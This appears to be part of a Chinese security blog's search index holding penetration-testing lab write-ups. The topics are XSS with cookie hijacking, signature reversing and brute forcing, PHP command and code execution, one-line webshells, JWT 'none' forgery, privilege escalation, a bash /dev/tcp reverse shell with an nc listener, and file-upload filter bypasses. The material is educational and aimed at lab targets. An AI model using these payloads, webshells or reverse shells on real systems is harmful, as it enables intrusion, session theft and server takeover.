+将javascript:alert(/xss/)进行16进制实体编码:&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x2f;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x2f;&amp;#x29;
+
+
+成功弹窗！！！
+4、xss防御手段//实体编码，防御&lt; &gt; &quot; &amp;，默认情况不防御&#x27;htmlspecialchars()
+
+
+//字符串替换，将匹配到的字符串替换为定义的字符串str_replace(&quot;匹配的字符串&quot;,&quot;定义的字符串&quot;,$str)//示例，将字符串&lt;script，替换为&lt;scr_ipt$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);
+
+
+//将字符串全转换为小写strtolower()
+
+
+
+5、xss盲打xss盲打需要存在存储型xss，并且是普通用户进行输入，管理员进行查看，如意见反馈
+在客户端页面的xss盲打表单中输入xss语句，点击提交
+payload：&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;
+
+
+进入后台，进行登录，账号admin，密码123456
+
+提交登录时发生了弹窗
+扩展cookie劫持用户输入端构造xss语句，点击提交
+payload：&lt;script&gt;alert(document.cookie)&lt;/script&gt;document.cookie//将cooike值保存为文档
+
+
+后台端刷新页面，成功弹出cookie，将cookie复制下来
+
+新开个浏览器进入后台登录页面，得使用同款浏览器，不然ua头不对可能导致失败
+
+打开F12，进入存储，新建cookie，将刚才的cookie复制进去
+
+输入后台的url地址，然后回车
+
+成功进入管理员端
+]]></content>
+  </entry>
+  <entry>
+    <title>渗透测试-前端逆向验签</title>
+    <url>/2025/08/24/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%89%8D%E7%AB%AF%E9%80%86%E5%90%91%E9%AA%8C%E7%AD%BE/</url>
+    <content><![CDATA[1、yakit验签与数据加密①验签随便输入用户名和密码登录
+
+抓包，发现有个签名部分
+
+分析前端加密代码
+&lt;script&gt;        var iv = CryptoJS.lib.WordArray.random(128/8);        function generateKey() &#123;        return  CryptoJS.enc.Utf8.parse(&quot;1234123412341234&quot;)  // 十六位十六进制数作为密钥    &#125;    const key = generateKey()    // 解密方法    function Decrypt(word) &#123;        return  CryptoJS.AES.decrypt(word, key, &#123;iv: iv&#125;).toString();     &#125;    // 加密方法    function Encrypt(word) &#123;        console.info(word);        return  CryptoJS.AES.encrypt(word, key, &#123;iv: iv&#125;).toString();     &#125;    function getData() &#123;        return &#123;            &quot;username&quot;: document.getElementById(&quot;username&quot;).value,            &quot;password&quot;: document.getElementById(&quot;password&quot;).value,        &#125;    &#125;    function outputObj(jsonData) &#123;        const word = JSON.stringify(jsonData);        return &#123;            &quot;data&quot;: Encrypt(word),            &quot;key&quot;: key.toString(),            iv: iv.toString(),        &#125;    &#125;    function submitJSON(event) &#123;        event.preventDefault();        const url = &quot;/crypto/js/lib/aes/cbc/handler&quot;;        let jsonData = getData();        let submitResult = JSON.stringify(outputObj(jsonData), null, 2)        console.log(&quot;key&quot;, key)        fetch(url, &#123;            method: &quot;POST&quot;,            headers: &#123;                &quot;Content-Type&quot;: &quot;application/json&quot;            &#125;,            body: submitResult,        &#125;)            .then(response =&gt; response.text())            .then(data =&gt; &#123;                console.log(&quot;Success:&quot;, data);                document.body.innerHTML = data;            &#125;)            .catch((error) =&gt; &#123;                console.error(&quot;Error:&quot;, error);            &#125;);    &#125;    document.getElementById(&quot;json-form&quot;).addEventListener(&quot;change&quot;, () =&gt; &#123;        let jsonData = &#123;            &quot;username&quot;: document.getElementById(&quot;username&quot;).value,            &quot;password&quot;: document.getElementById(&quot;password&quot;).value,        &#125;;        document.getElementById(&quot;encrypt&quot;).innerHTML = JSON.stringify(outputObj(jsonData), null, 2)        document.getElementById(&quot;input&quot;).innerHTML = JSON.stringify(jsonData, null, 2)    &#125;)    document.getElementById(&quot;json-form&quot;).addEventListener(&quot;submit&quot;, submitJSON)&lt;/script&gt;
+
+对用户名和密码进行了加密之后生成的签名
+写热加载代码
+//密钥是1234123412341234func sign(user,pass)&#123;    return codec.EncodeToHex(codec.HmacSha256(&quot;1234123412341234&quot;,f`username=$&#123;user&#125;&amp;password=$&#123;pass&#125;`)~)&#125;//提取用户名和密码signRequest = result =&gt; &#123;    pairs := result.SplitN(&quot;|&quot;,2)    dump(pairs)    return sign(pairs[0],pairs[1])&#125;
+
+启用后将密码字典设置为变量
+
+构造请求
+
+再进行爆破
+
+成功爆破
+②数据加密前端加密代码
+&lt;script&gt;        var iv = CryptoJS.lib.WordArray.random(128/8);        function generateKey() &#123;        return  CryptoJS.enc.Utf8.parse(&quot;1234123412341234&quot;)  // 十六位十六进制数作为密钥    &#125;    const key = generateKey()    // 解密方法    function Decrypt(word) &#123;        return  CryptoJS.AES.decrypt(word, key, &#123;iv: iv&#125;).toString();     &#125;    // 加密方法    function Encrypt(word) &#123;        console.info(word);        return  CryptoJS.AES.encrypt(word, key, &#123;iv: iv&#125;).toString();     &#125;    function getData() &#123;        return &#123;            &quot;username&quot;: document.getElementById(&quot;username&quot;).value,            &quot;password&quot;: document.getElementById(&quot;password&quot;).value,        &#125;    &#125;    function outputObj(jsonData) &#123;        const word = JSON.stringify(jsonData);        return &#123;            &quot;data&quot;: Encrypt(word),            &quot;key&quot;: key.toString(),            iv: iv.toString(),        &#125;    &#125;    function submitJSON(event) &#123;        event.preventDefault();        const url = &quot;/crypto/js/lib/aes/cbc/handler&quot;;        let jsonData = getData();        let submitResult = JSON.stringify(outputObj(jsonData), null, 2)        console.log(&quot;key&quot;, key)        fetch(url, &#123;            method: &quot;POST&quot;,            headers: &#123;                &quot;Content-Type&quot;: &quot;application/json&quot;            &#125;,            body: submitResult,        &#125;)            .then(response =&gt; response.text())            .then(data =&gt; &#123;                console.log(&quot;Success:&quot;, data);                document.body.innerHTML = data;            &#125;)            .catch((error) =&gt; &#123;                console.error(&quot;Error:&quot;, error);            &#125;);    &#125;    document.getElementById(&quot;json-form&quot;).addEventListener(&quot;change&quot;, () =&gt; &#123;        let jsonData = &#123;            &quot;username&quot;: document.getElementById(&quot;username&quot;).value,            &quot;password&quot;: document.getElementById(&quot;password&quot;).value,        &#125;;        document.getElementById(&quot;encrypt&quot;).innerHTML = JSON.stringify(outputObj(jsonData), null, 2)        document.getElementById(&quot;input&quot;).innerHTML = JSON.stringify(jsonData, null, 2)    &#125;)    document.getElementById(&quot;json-form&quot;).addEventListener(&quot;submit&quot;, submitJSON)&lt;/script&gt;
+
+热加载代码
+aescbc = result =&gt; &#123;result = codec.AESCBCEncryptWithPKCS7Padding(codec.DecodeHex(`31323334313233343132333431323334`)~,result,codec.DecodeHex(`255a6d83ab4a04d6e8308b9feb9e3a1b`)~,)~return string(result)&#125;
+
+构造请求
+
+爆破，但是爆破失败
+
+2、token防爆破随意输入账户密码进行抓包
+
+
+数据包发送到fuzz模块，并点击发送请求，找到响应返回的token值
+
+点击左侧配置，添加一个数据提取器，提取xpath数据，输入规则&#x2F;&#x2F;input[@name&#x3D;’token’]&#x2F;@value
+
+再设置一个变量，变量名为pass，值就是密码字典
+
+再次将数据包发送到fuzz，后点击左侧序列，添加序列
+
+在第二个序列中引用变量
+
+最后开始执行爆破，成功爆破
+
+]]></content>
+  </entry>
+  <entry>
+    <title>渗透测试-命令执行&amp;jwt伪造以及越权</title>
+    <url>/2025/08/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&amp;jwt%E4%BC%AA%E9%80%A0%E4%BB%A5%E5%8F%8A%E8%B6%8A%E6%9D%83/</url>
+    <content><![CDATA[1、php命令执行函数和代码执行函数①命令执行函数
+system()
+执行系统命令，自带回显
+&lt;?php$test=$_GET[&#x27;test&#x27;];system($test);?&gt;
+
+
+
+exec()
+执行系统命令，无回显，需要输出，且只输出最后一行
+&lt;?php$test=$_GET[&#x27;test&#x27;];echo exec($test);?&gt;
+
+
+
+shell_exec()
+执行系统命令，无回显，需要输出
+&lt;?php$test=$_GET[&#x27;test&#x27;];echo shell_exec($test);?&gt;
+
+
+
+passthru()
+执行系统命令，自带回显
+&lt;?php$test=$_GET[&#x27;test&#x27;];passthru($test);?&gt;
+
+
+
+popen()
+执行系统命令，无回显，需要使用文件读取输出
+&lt;?php$test=$_GET[&#x27;test&#x27;];echo fread(popen($test,&#x27;r&#x27;),10);?&gt;
+
+
+
+反引号
+&#96;反引号内字符串会被当做系统命令执行，无回显，需要输出
+&lt;?php$test=$_GET[&#x27;test&#x27;];echo `$test`;?&gt;
+
+
+
+
+②代码执行函数
+eval
+将内容当作代码执行，语句需要加 ; 
+&lt;?php$test=$_GET[&#x27;test&#x27;];eval($test);?&gt;
+
+
+
+assert
+将内容当作代码执行，不需要加 ；，且只能执行单条语句，如echo ‘123’ 无法执行，在高版本已移除这个函数
+&lt;?php$test=$_GET[&#x27;test&#x27;];assert($test);?&gt;
+
+
+
+preg_replace
+这个函数具有一个修饰符e，代表eval，使用这个修饰符时会将第二个参数，也就是待替换的字符串被当作代码执行
+&lt;?php$test=$_GET[&#x27;test&#x27;];$data=&quot;Hello, &#123;username&#125;!&quot;;$data=preg_replace(&quot;/\&#123;username\&#125;/e&quot;,$test,$data);echo $data;?&gt;
+
+
+
+call_user_func
+可以调用函数执行
+&lt;?php$test1=$_GET[&#x27;test1&#x27;];$test2=$_GET[&#x27;test2&#x27;];call_user_func($test1,$test2);?&gt;
+
+
+
+array_map
+同call_user_func类似，也能调用函数执行，但第二个参数必须是数组的形式
+&lt;?php$test1=$_GET[&#x27;test1&#x27;];$test2=array($_GET[&#x27;test2&#x27;]);array_map($test1,$test2);?&gt;
+
+
+
+
+2、代码执行函数编写一句话木马
+assert
+&lt;?php @assert($_GET[&#x27;test&#x27;]);?&gt;
+
+
+
+preg_replace
+&lt;?php @preg_replace(&quot;/a/e&quot;,$_GET[&#x27;real&#x27;],$_GET[&#x27;fake&#x27;]);?&gt;
+
+
+
+call_user_func
+&lt;?php @call_user_func($_GET[&#x27;func&#x27;],$_GET[&#x27;sys&#x27;]);?&gt;
+
+
+
+array_map
+&lt;?php @array_map($_GET[&#x27;func&#x27;],array($_GET[&#x27;sys&#x27;]))?&gt;
+
+
+
+
+3、JWT伪造jwt为json格式的web令牌，分为三部分组成，头部、载荷、签名，可以进行伪造，无加密或者爆破加密密钥
+①pass-4访问靶场，点击删除，进行抓包
+
+提示只有admin有权限重置，并且进行了jwt校验
+
+
+将jwt复制下来，发送到jwt.io平台查看jwt的内容，head记录了签名使用的算法，payload记录了用户的身份信息，签名则用于验证信息的合法性
+
+修改head和payload内容，进行base64编码，当head内容为none时表示未使用算法，所以签名部分为空
+eyJhbGciOiJub25lIn0.eyJpYXQiOjE3NTcyMzU1NjAsImFkbWluIjoidHVyZSIsInVzZXIiOiJUb20ifQ.
+
+
+
+然后重新构造数据包，将jwt更换，然后发送
+
+成功重置
+
+②pass-7要求具有有效jwt才能进行支付，我们伪造一个用户的jwt，让他帮忙支付
+
+虽然目前没有jwt，但是可以查看日志，日志里有可能将过期的jwt记录下来
+
+拿到了一串jwt
+eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q
+
+然后去进行伪造，还是同样的方法，将算法设置为none，还需要进行设置时间戳，这里exp代表令牌的结束时间，想要让这个令牌再次生效的话就要更改
+
+找到一个时间戳生成平台，获取一个较靠后的时间戳
+
+伪造jwt
+eyJhbGciOiJub25lIn0.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTc1NjM4MDQ0NSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.
+
+
+构造请求包发送，这个请求包jwt在Authorization字段
+
+4、通关pikachu靶场的越权①水平越权查看个人信息，发现是通过get传参一个用户名查看的
+
+修改参数为kobe
+
+成功查看到其他人信息
+②垂直越权admin账户有添加功能，和删除功能，并且有专属的url地址
+
+登录普通用户，去访问添加用户的地址
+http://192.168.18.175/pikachu-master/vul/overpermission/op2/op2_admin_edit.php
+
+
+可以进到添加页面，随意添加一个用户查看
+
+成功添加
+]]></content>
+  </entry>
+  <entry>
+    <title>linux重定向与bash反弹</title>
+    <url>/2025/08/05/%E9%87%8D%E5%AE%9A%E5%90%91%E4%B8%8Ebash%E5%8F%8D%E5%BC%B9/</url>
+    <content><![CDATA[一、重定向1.文件描述符（fd）在linux系统中，文件描述符是一个非负整数（0、1、2、3……），它是用于唯一标识一个进程打开的文件、管道、网络连接或其他I&#x2F;O资源。
+2.标准流linux中，每个进程会分配三个标准流，标准输入流、标准输出流、错误输出流，这三个流以三个不同的文件描述符进行标识。
+①标准输入（stdin，fd 0）
+  如键盘输入一个a
+②标准输出（stdout，fd 1）
+  如屏幕显示一个a
+③错误输出（stderr，fd 2）
+  如屏幕显示一个b
+3.重定向是什么重定向就是可以将一个输入或输出重定向到另一个文件当中
+这里引入一个概念——-管道符，管道符的作用就是将前一个指令的输出作为后一个指令的输入，常用的管道符如:
+&lt;
+&lt;&lt;
+|
+&amp;
+举个例子
+#当输入echo 123 &gt; 123.txt123会输入到123.txt当中，而不是回显到终端
+
+二、重定向案例1.正确和错误都输入到相同位置首先，我们新建一个目录，&#x2F;test1&#x2F;123
+mkdir -p /test1/123
+
+然后输入以下内容
+ls /test1 /test2#正常返回这样[root@study /]# ls /test1 /test2ls: 无法访问&#x27;/test2&#x27;: 没有那个文件或目录/test1:123#现在我们输入ls /test1 /test2 &amp;&gt; 456.txtcat 456.txt#则返回[root@study /]# ls /test1 /test2 &amp;&gt; 456.txt[root@study /]# cat 456.txtls: 无法访问&#x27;/test2&#x27;: 没有那个文件或目录/test1:123
+
+正确的输出和错误的输出已经保存在456.txt文件里面了
+2.将正确的输出和错误的输出重定向到不同文件ls /test1 /test2 1&gt; output.txt 2&gt; errorput.txt[root@study /]# ls /test1 /test2 1&gt; output.txt 2&gt; errorput.txt[root@study /]# cat output.txt /test1:123[root@study /]# cat errorput.txt ls: 无法访问&#x27;/test2&#x27;: 没有那个文件或目录
+
+可以看到指向了不同的文件
+3.将错误输出合并到正确输出，再一起重定向到文件ls /test1 /test2 &gt; 123.txt 2&gt;&amp;1[root@study /]# ls /test1 /test2 &gt; 123.txt 2&gt;&amp;1[root@study /]# cat 123.txtls: 无法访问&#x27;/test2&#x27;: 没有那个文件或目录/test1:123
+
+可以看到，进行合并并且指向了123.txt文件
+这里的方式和案例1的结果其实差不多，这里的&amp;1标识的是文件标识符（fd），不是文件1，所以在进行合并的时候必须写上&amp;
+三、bash反弹1.shell是什么shell就是一种解释器，用于用户和内核交互的桥梁，计算机只能读懂二进制语言，读不懂人类语言，所以需要一个解释器去进行翻译，比如你在终端输入一个ls，那么你的shell就将这个命令翻译为二进制，计算机内核才能读懂，才能处理你的命令
+2.bash是什么bash就是shell的一种类型，是shell的具体实现，你的操作系统终端输入命令的地方就是bsah，但是bash不仅仅只能解释命令，如：ls、cat、vim等，它也能执行复杂流程，如运行脚本
+3.反弹bashbash -i &gt;&amp; /dev/tcp/192.168.x.x/xxxx 0&gt;&amp;1
+
+命令解释
+
+bash -i
+
+打开一个交互的bash，就是命令行
+
+&#x2F;dev&#x2F;tcp&#x2F;
+
+linux中的特殊设备，打开这个文件相当于发送一个socket调用，建立socket连接，后续在这个连接中传输数据
+
+&#x2F;dev&#x2F;tcp&#x2F;192.168.x.x&#x2F;xxxx
+
+向192.168.x.x:xxxx发起连接
+
+bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.x.x&#x2F;xxxx
+
+将正确输出和错误输重定向到这个连接
+
+0&gt;&amp;1
+
+将标准输入与正确输出合并，并一起重定向到这个连接
+4.实操实验机：kali、centos8
+①在kali上，使用nc工具监听1234端口（端口可以自定义）
+nc -lnvp 1324#正常返回这个┌──(root㉿kali)-[/home/kali]└─# nc -lnvp 1234 listening on [any] 1234 ...
+
+②在centos上，执行反弹命令
+#首先查看kali的ipifconfig#在centos上输入，这里的ip地址输入kali的地址，端口输入你监听的端口bash -i &gt;&amp; /dev/tcp/192.168.x.x/xxxx 0&gt;&amp;1#再次返回到kali，出现以下bash表示成功                                                                             ┌──(root㉿kali)-[/home/kali]└─# nc -lnvp 1234 listening on [any] 1234 ...connect to [192.168.18.169] from (UNKNOWN) [192.168.18.168] 42486[root@study /]# 
+
+③试着执行命令，如查看&#x2F;etc&#x2F;passwd
+cat /etc/passwd
+
+
+]]></content>
+  </entry>
+  <entry>
+    <title>渗透测试-文件上传</title>
+    <url>/2025/08/21/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
+    <content><![CDATA[1、文件上传靶场文件上传漏洞的根本原理在于：应用程序未能对用户上传的文件进行充分、有效的安全验证，导致攻击者能够上传并执行恶意文件，从而完全接管服务器。
+简单来说，就是一个本应只上传图片、文档等安全文件的功能，因为缺乏检查，被攻击者利用来上传了“木马后门”程序（如.php, .jsp, .aspx文件）
+①pass-1源码
+function checkFile() &#123;    var file = document.getElementsByName(&#x27;upload_file&#x27;)[0].value;    if (file == null || file == &quot;&quot;) &#123;        alert(&quot;请选择要上传的文件!&quot;);        return false;    &#125;    //定义允许上传的文件类型    var allow_ext = &quot;.jpg|.png|.gif&quot;;    //提取上传文件的类型    var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));    //判断上传文件类型是否允许上传    if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) &#123;        var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;        alert(errMsg);        return false;    &#125;&#125;
+
+这是前端js代码，只允许上传jpg、png、gif文件，既然是前端，直接F12操作
+
+删除return checkfile，然后上传文件
+
+成功上传！！！点击图片去访问
+
+②pass-2源码
+$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]                        if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;文件类型不正确，请重新上传！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH.&#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
+
+对上传文件的MIME类型进行了限制，只允许image&#x2F;jpeg，image&#x2F;png、image&#x2F;gif，使用yakit抓包进行上传
+
+修改Content-Type的内容为image&#x2F;jpeg然后发送包
+
+访问图片
+
+
+成功上传！！！
+③pass-3源码
+$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;);        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //收尾去空        if(!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;                        if (move_uploaded_file($temp_file,$img_path)) &#123;                 $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
+
+设置了黑名单，禁止上传asp、aspx、php、isp文件，并且限制大小写，通过上传非常规后缀名的文件，如php3、php4、phtml，这些文件会被作为php解析，但是需要修改apache配置文件
+
+随后修改要上传的文件后缀名为php3
+
+上传成功后，访问该文件
+
+④pass-4源码
+$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;);        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //收尾去空        if (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;此文件不允许上传!&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
+
+设置了黑名单，并且几乎所有文件都被进行了限制，可以先上传一个.htaccess文件，这个文件生效于当前目录，并且写入SetHandler application&#x2F;x-httpd-php，这个配置会将该目录下的所有文件都当作php来解析，重启apache
+
+然后将php文件改后缀为png文件上传
+
+然后访问该文件
+
+成功解析！！！
+⑤pass-10源码
+$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);        $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);        $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];        $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;                if (move_uploaded_file($temp_file, $img_path)) &#123;            $is_upload = true;        &#125; else &#123;            $msg = &#x27;上传出错！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
+
+设置了黑名单，并且限制几乎所有文件，但是进行字符过滤的时候，是将匹配到的字符无论大小写都替换为空，所以可以进行双写绕过
+抓包进行上传，将文件名后缀改为pphphp
+
+
+2、文件上传防御函数编写php代码
+&lt;?phpheader(&#x27;Content-Type: text/html; charset=utf-8&#x27;); // 定义deldot函数，删除文件末尾的点function deldot($s)&#123;    for($i = strlen($s)-1;$i&gt;0;$i--)&#123;        $c = substr($s,$i,1);        if($i == strlen($s)-1 and $c != &#x27;.&#x27;)&#123;            return $s;        &#125;        if($c != &#x27;.&#x27;)&#123;            return substr($s,0,$i+1);        &#125;    &#125;&#125;$test=$_GET[&#x27;test&#x27;];echo check($test);function check($k)&#123;        //黑名单策略		$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $deny_ext1 = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;php1&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;pHp&quot;,&quot;pHp5&quot;,&quot;pHp4&quot;,&quot;pHp3&quot;,&quot;pHp2&quot;,&quot;pHp1&quot;,&quot;Html&quot;,&quot;Htm&quot;,&quot;pHtml&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;jSp&quot;,&quot;jSpx&quot;,&quot;jSpa&quot;,&quot;jSw&quot;,&quot;jSv&quot;,&quot;jSpf&quot;,&quot;jHtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;aSp&quot;,&quot;aSpx&quot;,&quot;aSa&quot;,&quot;aSax&quot;,&quot;aScx&quot;,&quot;aShx&quot;,&quot;aSmx&quot;,&quot;cEr&quot;,&quot;sWf&quot;,&quot;swf&quot;,&quot;htaccess&quot;);		$file_name = trim($k);//首尾去空        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);//保留文件后缀        $file_ext = strtolower($file_ext); //转换为小写,防御大小写绕过        $file_ext = str_ireplace($deny_ext1,&#x27;forbid&#x27;, $file_ext);//防御双写绕过		$file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //首尾去空        if(!in_array($file_ext, $deny_ext) &amp;&amp; strpos($file_ext,&#x27;forbid&#x27;)==false) &#123;            //文件重命名，防御解析漏洞利用            echo &quot;成功上传&quot;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;                    &#125; else &#123;            echo &quot;禁止上传该后缀文件！！&quot;;        &#125;&#125;?&gt;
+
+测试
+shell.pHP\shell.jsjspp\shell.pHp.adb.woqoj.dddl
+
+
+成功防御大小写
+
+成功防御双写
+
+
+虽然上传成功，但是进行了重命名，并且无法上传.htaccess，shell无法被利用
+3、waf绕过，上传一句话木马利用脏数据进行绕过
+使用yakit进行抓包，手动劫持，客户端上传文件
+
+
+通过脏数据进行绕过，在form-data后面加，然后发送
+
+
+成功绕过waf
